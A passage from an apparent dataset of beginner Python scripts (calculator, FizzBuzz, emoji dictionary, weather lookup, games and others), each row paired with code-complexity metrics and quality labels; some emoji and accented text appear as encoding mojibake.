        c = multiply.b * (eval(txt1.get()))
        cls()
        txt1.insert(0, c)
    elif x == 4:
        c = divide.b / (eval(txt1.get()))
        cls()
        txt1.insert(0, c)


def cls():
    global x
    x = 0
    txt1.delete(0, END)


def multiply():
    global x
    multiply.b = eval(txt1.get())
    txt1.delete(0, END)
    x = x + 3


def divide():
    global x
    divide.b = eval(txt1.get())
    txt1.delete(0, END)
    x = x + 4


# Labels

lbl1 = Label(
    w, text=""Calculatorax"", font=(""Times New Roman"", 35), fg=""#232226"", bg=""#fc9d03""
)

# Entryboxes
txt1 = Entry(w, width=80, font=30)

# Buttons

btn1 = Button(w, text=""1"", font=(""Unispace"", 25), command=calc1, bg=""#c3c6d9"")
btn2 = Button(w, text=""2"", font=(""Unispace"", 25), command=calc2, bg=""#c3c6d9"")
btn3 = Button(w, text=""3"", font=(""Unispace"", 25), command=calc3, bg=""#c3c6d9"")
btn4 = Button(w, text=""4"", font=(""Unispace"", 25), command=calc4, bg=""#c3c6d9"")
btn5 = Button(w, text=""5"", font=(""Unispace"", 25), command=calc5, bg=""#c3c6d9"")
btn6 = Button(w, text=""6"", font=(""Unispace"", 25), command=calc6, bg=""#c3c6d9"")
btn7 = Button(w, text=""7"", font=(""Unispace"", 25), command=calc7, bg=""#c3c6d9"")
btn8 = Button(w, text=""8"", font=(""Unispace"", 25), command=calc8, bg=""#c3c6d9"")
btn9 = Button(w, text=""9"", font=(""Unispace"", 25), command=calc9, bg=""#c3c6d9"")
btn0 = Button(w, text=""0"", font=(""Unispace"", 25), command=calc0, bg=""#c3c6d9"")

btn_addition = Button(w, text=""+"", font=(""Unispace"", 26), command=add, bg=""#3954ed"")
btn_equals = Button(
    w,
    text=""Calculate"",
    font=(
        ""Unispace"",
        24,
    ),
    command=equals,
    bg=""#e876e6"",
)
btn_clear = Button(
    w,
    text=""Clear"",
    font=(
        ""Unispace"",
        24,
    ),
    command=cls,
    bg=""#e876e6"",
)
btn_subtract = Button(
    w, text=""-"", font=(""Unispace"", 26), command=subtract, bg=""#3954ed""
)
btn_multiplication = Button(
    w, text=""x"", font=(""Unispace"", 26), command=multiply, bg=""#3954ed""
)
btn_division = Button(w, text=""Ã·"", font=(""Unispace"", 26), command=divide, bg=""#3954ed"")

# Placements(Labels)

lbl1.place(x=120, y=0)

# Placements(entrybox)

txt1.place(x=7, y=50, height=35)

# Placements(Buttons)
btn1.place(x=50, y=100)
btn2.place(x=120, y=100)
btn3.place(x=190, y=100)
btn4.place(x=50, y=200)
btn5.place(x=120, y=200)
btn6.place(x=190, y=200)
btn7.place(x=50, y=300)
btn8.place(x=120, y=300)
btn9.place(x=190, y=300)
btn0.place(x=120, y=400)

btn_addition.place(x=290, y=100)
btn_equals.place(x=260, y=420)
btn_clear.place(x=290, y=350)
btn_subtract.place(x=360, y=100)
btn_multiplication.place(x=290, y=200)
btn_division.place(x=360, y=200)

w.mainloop()
",4574,137,161,53,9,9,0,,21,22,5,44.0,38,,66,211.03088598529305,358.13347381033844,2.8947368421052637,bajo,No,False,False,Medium,id270
quote.py,"# Sends inspirational quotes to the user using Zen Quotes API

# Format
""""""
example quote -Quote Author Name
""""""

import requests
from json import loads


def return_quote():
    response = requests.get(""https://zenquotes.io/api/random"")
    json_data = loads(response.text)
    quote = (
        json_data[0][""q""] + "" -"" + json_data[0][""a""]
    )  # aligning the quote and it's author name in one string
    return quote


quote = return_quote()
print(quote)
",460,10,11,6,3,2,3,,1,2,1,4.0,4,,6,8.0,13.931568569324174,0.5,alto,No,False,False,Low,id271
Python Program to Merge Mails.py,"# Python program to mail merger
# Names are in the file names.txt
# Body of the mail is in body.txt

# open names.txt for reading
with open(""names.txt"", 'r', encoding='utf-8') as names_file:

    # open body.txt for reading
    with open(""body.txt"", 'r', encoding='utf-8') as body_file:

        # read entire content of the body
        body = body_file.read()

        # iterate over names
        for name in names_file:
            mail = ""Hello "" + name.strip() + ""\n"" + body

            # write the mails to individual files
            with open(name.strip()+"".txt"", 'w', encoding='utf-8') as mail_file:
                mail_file.write(mail)

",651,7,7,6,8,8,0,0.0,0,4,1,8.0,8,,12,24.0,38.03910001730775,0.5,alto,No,False,False,Low,id272
FizzBuzz.py,"# FizzBuzz
# A program that prints the numbers from 1 to num (User given number)!
# For multiples of â3â print âFizzâ instead of the number.
# For the multiples of â5â print âBuzzâ.
# If the number is divisible by both 3 and 5 then print ""FizzBuzz"".
# If none of the given conditions are true then just print the number!


def FizzBuzz(num):
    for i in range(1, num + 1):
        if i % 3 == 0 and i % 5 == 0:
            print(""FizzBuzz"")
        elif i % 3 == 0:
            print(""Fizz"")
        elif i % 5 == 0:
            print(""Buzz"")
        else:
            print(i)



FizzBuzz(20)  # prints FizzBuzz up to 20
",639,11,11,5,7,6,0,1.0,6,10,4,20.0,12,,30,51.01955000865388,120.0,3.333333333333333,alto,No,False,False,Low,id273
emoji_dictionary.py,"# Emoji Dictionary

# -----------------------------------------------------------------------------------------------------
import io  # used for dealing with input and output
from tkinter import *  # importing the necessary libraries
import tkinter.messagebox as mbox
import tkinter as tk  # imported tkinter as tk
import emoji

# -----------------------------------------------------------------------------------------------


class Keypad(tk.Frame):

    cells = [
        [""ð"", ""ð¥°"", ""ð´"", ""ð¤"", ""ð¤®"", ""ð¤¬"", ""ð¨"", ""ð¤"", ""ð«"", ""ð""],
        [
            ""ð"",
            ""ð"",
            ""ð"",
            ""ðª"",
            ""ð"",
            ""ð"",
            ""ð¦"",
            ""ð¦"",
            ""ð"",
            ""ð"",
            ""ð"",
            ""ð¦´"",
            ""ð©ð¿"",
            ""âð¤"",
            ""ð§"",
            ""ð¾"",
            ""ð±ð½"",
            ""ââ"",
            ""ð"",
            ""ð¨"",
            ""â½"",
        ],
        [
            ""ð"",
            ""ð"",
            ""ð"",
            ""â"",
            ""ð´"",
            ""ð"",
            ""ð"",
            ""ð´"",
            ""ðµ"",
            ""ðº"",
            ""ð²"",
            ""ð´"",
            ""ð"",
            ""ð"",
            ""â"",
            ""ð°"",
            ""ð¦"",
            ""ð³"",
            ""âð"",
            ""ð"",
            ""ð§­"",
        ],
        [
            ""ð¥"",
            ""â"",
            ""ð"",
            ""ð"",
            ""ð"",
            ""ð"",
            ""ð§"",
            ""ð§º"",
            ""ð§·"",
            ""ðª"",
            ""â²"",
            ""ð¼"",
            ""ð"",
            ""ð"",
            ""âð¨"",
            ""ð¬"",
            ""â¢"",
            ""ð¯"",
            ""ð"",
            ""ð¥"",
            ""â¤"",
        ],
    ]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        self.target = None
        self.memory = """"

        for y, row in enumerate(self.cells):
            for x, item in enumerate(row):
                b = tk.Button(
                    self,
                    text=item,
                    command=lambda text=item: self.append(text),
                    font=(""Arial"", 14),
                    bg=""yellow"",
                    fg=""blue"",
                    borderwidth=3,
                    relief=""raised"",
                )
                b.grid(row=y, column=x, sticky=""news"")

        x = tk.Button(
            self,
            text=""Space"",
            command=self.space,
            font=(""Arial"", 14),
            bg=""yellow"",
            fg=""blue"",
            borderwidth=3,
            relief=""raised"",
        )
        x.grid(row=0, column=10, columnspan=""2"", sticky=""news"")

        x = tk.Button(
            self,
            text=""tab"",
            command=self.tab,
            font=(""Arial"", 14),
            bg=""yellow"",
            fg=""blue"",
            borderwidth=3,
            relief=""raised"",
        )
        x.grid(row=0, column=12, columnspan=""2"", sticky=""news"")

        x = tk.Button(
            self,
            text=""Backspace"",
            command=self.backspace,
            font=(""Arial"", 14),
            bg=""yellow"",
            fg=""blue"",
            borderwidth=3,
            relief=""raised"",
        )
        x.grid(row=0, column=14, columnspan=""3"", sticky=""news"")

        x = tk.Button(
            self,
            text=""Clear"",
            command=self.clear,
            font=(""Arial"", 14),
            bg=""yellow"",
            fg=""blue"",
            borderwidth=3,
            relief=""raised"",
        )
        x.grid(row=0, column=17, columnspan=""2"", sticky=""news"")

        x = tk.Button(
            self,
            text=""Hide"",
            command=self.hide,
            font=(""Arial"", 14),
            bg=""yellow"",
            fg=""blue"",
            borderwidth=3,
            relief=""raised"",
        )
        x.grid(row=0, column=19, columnspan=""2"", sticky=""news"")

    def get(self):
        if self.target:
            return self.target.get()

    def append(self, text):
        if self.target:
            self.target.insert(""end"", text)

    def clear(self):
        if self.target:
            self.target.delete(0, END)

    def backspace(self):
        if self.target:
            text = self.get()
            text = text[:-1]
            self.clear()
            self.append(text)

    def space(self):
        if self.target:
            text = self.get()
            text = text + "" ""
            self.clear()
            self.append(text)

    def tab(self):  # 5 spaces
        if self.target:
            text = self.get()
            text = text + ""     ""
            self.clear()
            self.append(text)

    def copy(self):
        # TODO: copy to clipboad
        if self.target:
            self.memory = self.get()
            self.label[""text""] = ""memory: "" + self.memory
            print(self.memory)

    def paste(self):
        # TODO: copy from clipboad
        if self.target:
            self.append(self.memory)

    def show(self, entry):
        self.target = entry

        self.place(relx=0.5, rely=0.6, anchor=""c"")

    def hide(self):
        self.target = None

        self.place_forget()


# function defined th=o clear both the input text and output text --------------------------------------------------
def clear_text():
    inputentry.delete(0, END)
    outputtxt.delete(""1.0"", ""end"")


# function to search emoji
def search_emoji():
    word = inputentry.get()
    if word == """":
        outputtxt.insert(END, ""You have entered no emoji."")
    else:
        means = emoji.demojize(word)
        outputtxt.insert(END, ""Meaning of Emoji  :  "" + str(word) + ""\n\n"" + means)


# main window created
window = tk.Tk()
window.title(""Emoji Dictionary"")
window.geometry(""1000x700"")

# for writing Dictionary label, at the top of window
dic = tk.Label(
    text=""EMOJI DICTIONARY"", font=(""Arial"", 50, ""underline""), fg=""magenta""
)  # same way bg
dic.place(x=160, y=10)

start1 = tk.Label(
    text=""Enter any Emoji you want to search..."", font=(""Arial"", 30), fg=""green""
)  # same way bg
start1.place(x=160, y=120)

myname = StringVar(window)
firstclick1 = True


def on_inputentry_click(event):
    """"""function that gets called whenever entry1 is clicked""""""
    global firstclick1

    if firstclick1:  # if this is the first time they clicked it
        firstclick1 = False
        inputentry.delete(0, ""end"")  # delete all the text in the entry


# Taking input from TextArea
# inputentry = Entry(window,font=(""Arial"", 35), width=33, border=2)
inputentry = Entry(
    window, font=(""Arial"", 35), width=28, border=2, bg=""light yellow"", fg=""brown""
)
inputentry.place(x=120, y=180)

# # Creating Search Button
Button(
    window,
    text=""ð SEARCH"",
    command=search_emoji,
    font=(""Arial"", 20),
    bg=""light green"",
    fg=""blue"",
    borderwidth=3,
    relief=""raised"",
).place(x=270, y=250)

# # creating clear button
Button(
    window,
    text=""ð§¹ CLEAR"",
    command=clear_text,
    font=(""Arial"", 20),
    bg=""orange"",
    fg=""blue"",
    borderwidth=3,
    relief=""raised"",
).place(x=545, y=250)

# meaning label
start1 = tk.Label(text=""Meaning..."", font=(""Arial"", 30), fg=""green"")  # same way bg
start1.place(x=160, y=340)

# # Output TextBox Creation
outputtxt = tk.Text(
    window,
    height=7,
    width=57,
    font=(""Arial"", 17),
    bg=""light yellow"",
    fg=""brown"",
    borderwidth=3,
    relief=""solid"",
)
outputtxt.place(x=120, y=400)

# function for exiting
def exit_win():
    if mbox.askokcancel(""Exit"", ""Do you want to exit?""):
        window.destroy()


# # creating exit button
Button(
    window,
    text=""â EXIT"",
    command=exit_win,
    font=(""Arial"", 20),
    bg=""red"",
    fg=""black"",
    borderwidth=3,
    relief=""raised"",
).place(x=435, y=610)

keypad = Keypad(window)

# # creating speech to text button
v_keypadb = Button(
    window,
    text=""â¨"",
    command=lambda: keypad.show(inputentry),
    font=(""Arial"", 18),
    bg=""light yellow"",
    fg=""green"",
    borderwidth=3,
    relief=""raised"",
).place(x=870, y=183)

window.protocol(""WM_DELETE_WINDOW"", exit_win)
window.mainloop()
",8295,110,282,49,27,19,0,,31,8,3,15.0,15,,23,63.35824643629125,95.90827503317318,1.5,medio,Yes,False,False,Low,id274
Sorting_List.py,"class Node:
    def __init__(self, data):
        self.data = data
        self.next = None


class Linked_List:
    def __init__(self):
        self.head = None

    def Insert_At_End(self, new_data):
        new_node = Node(new_data)
        if self.head is None:
            self.head = new_node
            return
        current = self.head
        while current.next:
            current = current.next
        current.next = new_node

    def Sort(self):
        temp = self.head
        while temp:
            minn = temp
            after = temp.next
            while after:
                if minn.data > after.data:
                    minn = after
                after = after.next
            key = temp.data
            temp.data = minn.data
            minn.data = key
            temp = temp.next

    def Display(self):
        temp = self.head
        while temp:
            print(temp.data, ""->"", end="" "")
            temp = temp.next
        print(""None"")


if __name__ == ""__main__"":
    L_list = Linked_List()
    L_list.Insert_At_End(8)
    L_list.Insert_At_End(5)
    L_list.Insert_At_End(10)
    L_list.Insert_At_End(7)
    L_list.Insert_At_End(6)
    L_list.Insert_At_End(11)
    L_list.Insert_At_End(9)
    print(""Linked List: "")
    L_list.Display()
    print(""Sorted Linked List: "")
    L_list.Sort()
    L_list.Display()
",1355,49,49,7,0,0,0,5.0,16,3,3,6.0,5,,9,16.36452797660028,27.0,1.8,bajo,Yes,False,False,Low,id275
finding LCM.py,"
# Python Program to find the L.C.M. of two input number

def compute_lcm(x, y):

   # choose the greater number
   if x > y:
       greater = x
   else:
       greater = y

   while(True):
       if((greater % x == 0) and (greater % y == 0)):
           lcm = greater
           break
       greater += 1

   return lcm

num1 = 54
num2 = 24

print(""The L.C.M. is"", compute_lcm(num1, num2))
",391,14,14,7,2,2,0,1.0,5,7,5,14.0,9,,21,40.13896548741762,79.95445336320968,3.888888888888889,alto,No,False,False,Low,id276
Classification_human_or_horse.py,"import pickle

import tensorflow as tf

model = tf.keras.models.Sequential(
    [
        tf.keras.layers.Conv2D(
            16, (3, 3), activation=""relu"", input_shape=(200, 200, 3)
        ),
        tf.keras.layers.MaxPooling2D(2, 2),
        tf.keras.layers.Conv2D(16, (3, 3), activation=""relu""),
        tf.keras.layers.MaxPooling2D(2, 2),
        tf.keras.layers.Conv2D(16, (3, 3), activation=""relu""),
        tf.keras.layers.MaxPooling2D(2, 2),
        tf.keras.layers.Flatten(),
        tf.keras.layers.Dense(512, activation=""relu""),
        tf.keras.layers.Dense(1, activation=""sigmoid""),
    ]
)
model.summary()
from tensorflow.keras.optimizers import RMSprop

model.compile(optimizer=RMSprop(lr=0.001), loss=""binary_crossentropy"", metrics=[""acc""])
from tensorflow.keras.preprocessing.image import ImageDataGenerator

train_datagen = ImageDataGenerator(rescale=1 / 255)
train_generator = train_datagen.flow_from_directory(
    ""../Classification_human-or-horse"",
    target_size=(200, 200),
    batch_size=222,
    class_mode=""binary"",
)
model.fit_generator(train_generator, steps_per_epoch=6, epochs=1, verbose=1)
filename = ""myTf1.sav""
pickle.dump(model, open(filename, ""wb""))

from tkinter import Tk
from tkinter.filedialog import askopenfilename
from keras.preprocessing import image
import numpy as np

Tk().withdraw()
filename = askopenfilename()
print(filename)
img = image.load_img(filename, target_size=(200, 200))
x = image.img_to_array(img)
x = np.expand_dims(x, axis=0)
images = np.vstack([x])
classes = model.predict(images, batch_size=10)
print(classes[0])
if classes[0] > 0.5:
    print(filename + "" is a human"")
else:
    print(filename + "" is a horse"")
",1734,29,48,6,0,0,0,0.0,0,4,3,8.0,7,,12,24.406371956566694,39.86313713864836,1.7142857142857142,medio,No,False,False,Low,id277
chaos.py,"# A simple program illustrating chaotic behaviour


def main():
    print(""This program illustrates a chaotic function"")

    while True:
        try:
            x = float((input(""Enter a number between 0 and 1: "")))
            if 0 < x and x < 1:
                break
            else:
                print(""Please enter correct number"")
        except Exception as e:
            print(""Please enter correct number"")

    for i in range(10):
        x = 3.9 * x * (1 - x)
        print(x)


if __name__ == ""__main__"":
    main()
",535,16,16,6,1,1,0,1.0,6,7,5,14.0,10,15.0,21,44.82892142331043,82.0447025077789,3.5,medio,No,True,False,Low,id278
random_file_move.py,"# Script Name   : random_file_move.py
# Author(s)     : Akash Jain
# Created       : 1 September 2020
# Last Modified : 1 September 2020
# Version       : 1.0
# Description   : This will move specified number of files(given in ratio) from the src directory to dest directory.


import os, random
import argparse


def check_ratio(x):
    try:
        x = float(x)
    except ValueError:
        raise argparse.ArgumentTypeError(""%r not a floating-point literal"" % (x,))

    if x < 0.0 or x > 1.0:
        raise argparse.ArgumentTypeError(""%r not in range [0.0, 1.0]"" % (x))
    return x


desc = ""Script to move specified number of files(given in ratio) from the src directory to dest directory.""
usage = ""python random_file_move.py -src [SRC] -dest [DEST] -ratio [RATIO]""

parser = argparse.ArgumentParser(usage=usage, description=desc)
parser.add_argument(
    ""-src"",
    ""--src"",
    type=str,
    required=True,
    help=""(REQUIRED) Path to directory from which we cut files. Space not allowed in path."",
)
parser.add_argument(
    ""-dest"",
    ""--dest"",
    type=str,
    required=True,
    help=""(REQUIRED) Path to directory to which we move files. Space not allowed in path."",
)
parser.add_argument(
    ""-ratio"",
    ""--ratio"",
    type=check_ratio,
    required=True,
    help=""(REQUIRED) Ratio of files in 'src' and 'dest' directory."",
)

args = parser.parse_args()

src = args.src
dest = args.dest
ratio = args.ratio

files = os.listdir(src)
size = int(ratio * len(files))

print(""Move {} files from {} to {} ? [y/n]"".format(size, src, dest))
if input().lower() == ""y"":
    for f in random.sample(files, size):
        try:
            os.rename(os.path.join(src, f), os.path.join(dest, f))
        except Exception as e:
            print(e)
    print(""Successful"")
else:
    print(""Cancelled"")
",1809,32,50,12,6,6,0,,4,7,6,14.0,12,18.0,21,58.52932501298082,87.56842503028855,3.5,medio,No,True,True,Low,id279
Guess_the_number_game.py,"# using codeSkulpter

import random

import simplegui


def new_game():
    global num
    print(""new game starts"")


def range_of_100():
    global num
    num = random.randrange(0, 100)
    print(""your range is 0-100"")


def range_of_1000():
    global num
    num = random.randrange(0, 1000)
    print(""Your range is 0-1000"")


def input_guess(guess):
    global num
    print(""Your Guess is "", guess)
    num1 = int(guess)
    if num1 == num:
        print(""Correct"")
    elif num1 >= num:
        print(""Greater"")
    elif num1 <= num:
        print(""Lower"")


frame = simplegui.create_frame(""Guess The Number"", 200, 200)
frame.add_button(""range[0-1000)"", range_of_1000)
frame.add_button(""range[0-100)"", range_of_100)
frame.add_input(""enter your guess"", input_guess, 200)
frame.start()
new_game()
",802,29,29,12,1,1,0,,7,3,3,6.0,2,,9,6.754887502163469,20.89735285398626,4.5,medio,No,False,True,Low,id280
first.py,"""""""
Author : Dhruv B Kakadiya

""""""

# import libraries
import pygame as pg
from modules import statics as st
from modules.statics import *
from modules.checker_board import *
from modules.checker import *

# static variables for this perticular file
fps = 60

WIN = pg.display.set_mode((st.width, st.height))
pg.display.set_caption(""Checkers"")

# get row and col for mouse
def get_row_col_mouse(pos):
    x, y = pos
    row = y // sq_size
    col = x // sq_size
    return row, col


# main function
if __name__ == ""__main__"":

    # represents the game
    run = True

    # certain clock value default because it is varries from diff pc to pc
    clock = pg.time.Clock()

    # create board
    board = checker_board()
    game = checker(WIN)

    # main loop
    while run:
        clock.tick(fps)

        if board.winner() != None:
            print(board.winner())

        # check if any events is running or not
        for event in pg.event.get():
            if event.type == pg.QUIT:
                run = False

            if event.type == pg.MOUSEBUTTONDOWN:
                pos = pg.mouse.get_pos()
                row, col = get_row_col_mouse(pos)
                game.selectrc(row, col)
                # piece = board.get_piece(row, col)
                # board.move(piece, 4, 3)

        game.update()
    pg.quit()
",1335,32,31,15,11,11,3,,1,6,3,12.0,10,,18,37.97416845103709,66.60791492653966,1.8,alto,No,False,False,Low,id281
pyauto.py,"# Author-Slayking1965
# email-kingslayer8509@gmail.com
import random
import pyautogui
import string


chars = ""abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ""

chars = string.printable
chars_list = list(chars)


password = pyautogui.password(""Enter a password : "")

guess_password = """"

while guess_password != password:
    guess_password = random.choices(chars_list, k=len(password))

    print(""<=================="" + str(guess_password) + ""==================>"")

    if guess_password == list(password):
        print(""Your password is : "" + """".join(guess_password))
        break
",601,14,14,9,2,2,0,,0,5,3,10.0,9,,15,33.28421251514428,53.77443751081735,1.6666666666666667,alto,No,False,True,Low,id282
rangoli.py,"""""""Rangoli Model""""""


# Prints a rangoli of size n
def print_rangoli(n):
    """"""Prints a rangoli of size n""""""    
    # Width of the rangoli
    width = 4 * n - 3

    # String to be printed
    string = """"

    # Loop to print the rangoli
    for i in range(1, n + 1):
        for j in range(0, i):
            string += chr(96 + n - j)
            if len(string) < width:
                string += ""-""

        for k in range(i - 1, 0, -1):
            string += chr(97 + n - k)
            if len(string) < width:
                string += ""-""

        print(string.center(width, ""-""))
        string = """"

    for i in range(n - 1, 0, -1):
        for j in range(0, i):
            string += chr(96 + n - j)
            if len(string) < width:
                string += ""-""

        for k in range(i - 1, 0, -1):
            string += chr(97 + n - k)
            if len(string) < width:
                string += ""-""

        print(string.center(width, ""-""))
        string = """"


if __name__ == '__main__':
    n = int(input())
    print_rangoli(n)
",1054,30,28,11,4,6,0,1.0,11,30,6,57.0,27,,87,143.89173756274062,438.86228838418543,6.333333333333333,medio,No,True,False,Medium-High,id283
diction.py,"from difflib import get_close_matches
import pyttsx3
import json
import speech_recognition as sr

data = json.load(open(""data.json""))
engine = pyttsx3.init()
voices = engine.getProperty(""voices"")
engine.setProperty(""voice"", voices[0].id)


def speak(audio):
    engine.say(audio)
    engine.runAndWait()


def takeCommand():
    r = sr.Recognizer()
    with sr.Microphone() as source:
        print(""Listening..."")
        r.pause_threshold = 1
        r.energy_threshold = 494
        r.adjust_for_ambient_noise(source, duration=1.5)
        audio = r.listen(source)

    try:
        print(""Recognizing.."")
        query = r.recognize_google(audio, language=""en-in"")
        print(f""User said: {query}\n"")

    except Exception as e:
        # print(e)

        print(""Say that again please..."")
        return ""None""
    return query


def translate(word):
    word = word.lower()
    if word in data:
        speak(""Here is what I found in dictionary.."")
        d = data[word]
        d = """".join(str(e) for e in d)
        speak(d)
    elif len(get_close_matches(word, data.keys())) > 0:
        x = get_close_matches(word, data.keys())[0]
        speak(""Did you mean "" + x + "" instead,  respond with Yes or No."")
        ans = takeCommand().lower()
        if ""yes"" in ans:
            speak(""ok "" + ""It means.."" + data[x])
        elif ""no"" in ans:
            speak(""Word doesn't exist. Please make sure you spelled it correctly."")
        else:
            speak(""We didn't understand your entry."")

    else:
        speak(""Word doesn't exist. Please double check it."")


if __name__ == ""__main__"":
    translate()
",1626,48,48,13,1,1,0,3.0,9,9,4,18.0,17,21.0,27,77.48686830125578,118.59257041502654,2.117647058823529,medio,No,False,False,Low,id284
Background.py,"from tkinter import Tk, Canvas

from PIL.Image import open as openImage
from PIL.ImageTk import PhotoImage


class Background(Canvas):
    """"""
    Classe para gerar um plano de fundo animado
    """"""

    __background = []
    __stop = False

    def __init__(self, tk_instance, *geometry, fp=""background.png"", animation_speed=50):

        # Verifica se o parÃ¢metro tk_instance Ã© uma instÃ¢ncia de Tk
        if not isinstance(tk_instance, Tk):
            raise TypeError(""The tk_instance argument must be an instance of Tk."")

        # Recebe o caminho de imagem e a velocidade da animaÃ§Ã£o
        self.image_path = fp
        self.animation_speed = animation_speed

        # Recebe a largura e altura do widget
        self.__width = geometry[0]
        self.__height = geometry[1]

        # Inicializa o construtor da classe Canvas
        Canvas.__init__(
            self, master=tk_instance, width=self.__width, height=self.__height
        )

        # Carrega a imagem que serÃ¡ usada no plano de fundo
        self.__bg_image = self.getPhotoImage(
            image_path=self.image_path,
            width=self.__width,
            height=self.__height,
            closeAfter=True,
        )[0]

        # Cria uma imagem que serÃ¡ fixa, ou seja, que nÃ£o farÃ¡ parte da animaÃ§Ã£o e serve em situaÃ§Ãµes de bugs na animaÃ§Ã£o
        self.__background_default = self.create_image(
            self.__width // 2, self.__height // 2, image=self.__bg_image
        )

        # Cria as imagens que serÃ£o utilizadas na animaÃ§Ã£o do background
        self.__background.append(
            self.create_image(
                self.__width // 2, self.__height // 2, image=self.__bg_image
            )
        )
        self.__background.append(
            self.create_image(
                self.__width + (self.__width // 2),
                self.__height // 2,
                image=self.__bg_image,
            )
        )

    def getBackgroundID(self):
        """"""
        Retorna os id's das imagens de background
        """"""
        return [self.__background_default, *self.__background]

    @staticmethod
    def getPhotoImage(
        image=None, image_path=None, width=None, height=None, closeAfter=False
    ):
        """"""
        Retorna um objeto da classe PIL.ImageTk.PhotoImage de uma imagem e as imagens criadas de PIL.Image
        (photoImage, new, original)

        @param image: InstÃ¢ncia de PIL.Image.open
        @param image_path: DiretÃ³rio da imagem
        @param width: Largura da imagem
        @param height: Altura da imagem
        @param closeAfter: Se True, a imagem serÃ¡ fechada apÃ³s ser criado um PhotoImage da mesma
        """"""

        if not image:
            if not image_path:
                return

            # Abre a imagem utilizando o caminho dela
            image = openImage(image_path)

        # SerÃ¡ redimesionada a imagem somente se existir um width ou height
        if not width:
            width = image.width
        if not height:
            height = image.height

        # Cria uma nova imagem jÃ¡ redimensionada
        newImage = image.resize([width, height])

        # Cria um photoImage
        photoImage = PhotoImage(newImage)

        # Se closeAfter for True, ele fecha as imagens
        if closeAfter:
            # Fecha a imagem nova
            newImage.close()
            newImage = None

            # Fecha a imagem original
            image.close()
            image = None

        # Retorna o PhotoImage da imagem,a nova imagem que foi utilizada e a imagem original
        return photoImage, newImage, image

    def reset(self):
        """"""
        MÃ©todo para resetar o background, apagando todos os itens que nÃ£o sejam o plano de fundo
        """"""

        # Deleta todos os itens do canvas
        self.delete(""all"")

        # Para a animaÃ§Ã£o passando False para o atributo ""stop""
        self.__stop = False

        # Limpa a lista de imagens usadas na animaÃ§Ã£o
        self.__background.clear()

        # Cria uma imagem que serÃ¡ fixa, ou seja, que nÃ£o farÃ¡ parte da animaÃ§Ã£o e serve em situaÃ§Ãµes de bugs na animaÃ§Ã£o
        self.__background_default = self.create_image(
            self.__width // 2, self.__height // 2, image=self.__bg_image
        )

        # Cria as imagens que serÃ£o utilizadas na animaÃ§Ã£o do background
        self.__background.append(
            self.create_image(
                self.__width // 2, self.__height // 2, image=self.__bg_image
            )
        )
        self.__background.append(
            self.create_image(
                self.__width + (self.__width // 2),
                self.__height // 2,
                image=self.__bg_image,
            )
        )

    def run(self):
        """"""
        MÃ©todo para iniciar a animaÃ§Ã£o do background
        """"""

        # Enquanto o atributo ""stop"" for False, a animaÃ§Ã£o continuarÃ¡ em um loop infinito
        if not self.__stop:

            # Move as imagens de background na posiÃ§Ã£o X
            self.move(self.__background[0], -10, 0)
            self.move(self.__background[1], -10, 0)
            self.tag_lower(self.__background[0])
            self.tag_lower(self.__background[1])
            self.tag_lower(self.__background_default)

            # Se a primeira imagem da lista tiver saÃ­do da Ã¡rea do widget, uma nova serÃ¡ criada depois da segunda imagem
            if self.bbox(self.__background[0])[2] <= 0:
                # Deleta a primeira imagem da lista (imagem que saiu da Ã¡rea do widget)
                self.delete(self.__background[0])
                self.__background.remove(self.__background[0])

                # Cria uma nova imagem a partir da Ãºltima imagem da animaÃ§Ã£o
                width = self.bbox(self.__background[0])[2] + self.__width // 2
                self.__background.append(
                    self.create_image(width, self.__height // 2, image=self.__bg_image)
                )

            # Executa novamente o mÃ©todo depois de um certo tempo
            self.after(self.animation_speed, self.run)

    def stop(self):
        """"""
        MÃ©todo para parar a animaÃ§Ã£o do background
        """"""
        self.__stop = True
",6225,66,95,36,26,26,24,6.0,17,26,5,44.0,22,,70,109.71713608445737,332.8421251514428,5.0,medio,Yes,False,False,Medium,id285
Find current weather of any city using openweathermap API.py,"# Python program to find current 
# weather details of any city 
# using openweathermap api 

# import required modules 
import requests, json 

# Enter your API key here 
api_key = ""Your_API_Key""

# base_url variable to store url 
base_url = ""http://api.openweathermap.org/data/2.5/weather?""

# Give city name 
city_name = input(""Enter city name : "") 

# complete_url variable to store 
# complete url address 
complete_url = base_url + ""appid="" + api_key + ""&q="" + city_name 

# get method of requests module 
# return response object 
response = requests.get(complete_url) 

# json method of response object 
# convert json format data into 
# python format data 
x = response.json() 

# Now x contains list of nested dictionaries 
# Check the value of ""cod"" key is equal to 
# ""404"", means city is found otherwise, 
# city is not found 
if x[""cod""] != ""404"": 

	# store the value of ""main"" 
	# key in variable y 
	y = x[""main""] 

	# store the value corresponding 
	# to the ""temp"" key of y 
	current_temperature = y[""temp""] 

	# store the value corresponding 
	# to the ""pressure"" key of y 
	current_pressure = y[""pressure""] 

	# store the value corresponding 
	# to the ""humidity"" key of y 
	current_humidiy = y[""humidity""] 

	# store the value of ""weather"" 
	# key in variable z 
	z = x[""weather""] 

	# store the value corresponding 
	# to the ""description"" key at 
	# the 0th index of z 
	weather_description = z[0][""description""] 

	# print following values 
	print("" Temperature (in kelvin unit) = "" +
					str(current_temperature) +
		""\n atmospheric pressure (in hPa unit) = "" +
					str(current_pressure) +
		""\n humidity (in percentage) = "" +
					str(current_humidiy) +
		""\n description = "" +
					str(weather_description)) 

else: 
	print("" City Not Found "") 
",1776,17,24,16,32,32,0,0.0,0,12,2,24.0,24,,36,112.03910001730776,169.21582985307933,1.0,medio,No,True,False,Low,id286
sorting.py,"arr = [7, 2, 8, 5, 1, 4, 6, 3]
temp = 0

print(""Elements of original array: "")
for i in range(0, len(arr)):
    print(arr[i], end="" "")

for i in range(0, len(arr)):
    for j in range(i + 1, len(arr)):
        if arr[i] > arr[j]:
            temp = arr[i]
            arr[i] = arr[j]
            arr[j] = temp

print()


print(""Elements of array sorted in ascending order: "")
for i in range(0, len(arr)):
    print(arr[i], end="" "")
",432,15,15,5,0,0,0,0.0,0,2,2,4.0,4,,6,10.0,15.509775004326936,1.0,medio,No,False,False,Low,id287
rock_paper_scissor_game.py,"from __future__ import print_function

import random


# let
# 0 - rock
# 1 - paper
# 2 - scissor


def name_to_number(name):
    if name == ""rock"":
        name = 0
    elif name == ""paper"":
        name = 1
    elif name == ""scissors"":
        name = 2
    return name


def number_to_name(number):
    if number == 0:
        return ""rock""
    elif number == 1:
        return ""paper""
    elif number == 2:
        return ""scissors""


def game(player_choice):
    print()
    name = player_choice
    print(name)
